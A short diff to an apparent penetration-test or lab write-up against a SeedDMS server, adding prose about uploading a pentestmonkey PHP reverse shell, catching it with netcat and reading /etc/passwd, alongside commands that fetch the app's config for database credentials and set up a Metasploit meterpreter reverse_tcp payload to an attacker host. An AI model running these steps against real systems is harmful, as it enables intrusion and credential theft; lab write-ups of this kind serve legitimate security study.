@@ -16,6 +16,10 @@ curl http://192.168.87.104/seeddms51x/conf/settings.xml -sL | grep -i db
 Logging into the mysql database:
 mysql -u seeddms -pseeddms -D seeddms --silent -h 10.0.0.220
 
+I successfully created a reverse shell with a pentest monkey script and uploaded the document to the database. 
+Using a netcat listener I connected to the machine sucessfully and looked at the /etc/passwd file to find that we 
+had the password for one of the employees. 
+
 Using Metasploit to create a reverse shell:
 use payload/php/meterpreter/reverse_tcp
 set lhost 10.0.0.12
@@ -26,3 +30,5 @@ set payload php/meterpreter/reverse_tcp
 set lhost 10.0.0.12
 set lport 8080
 run
+
+
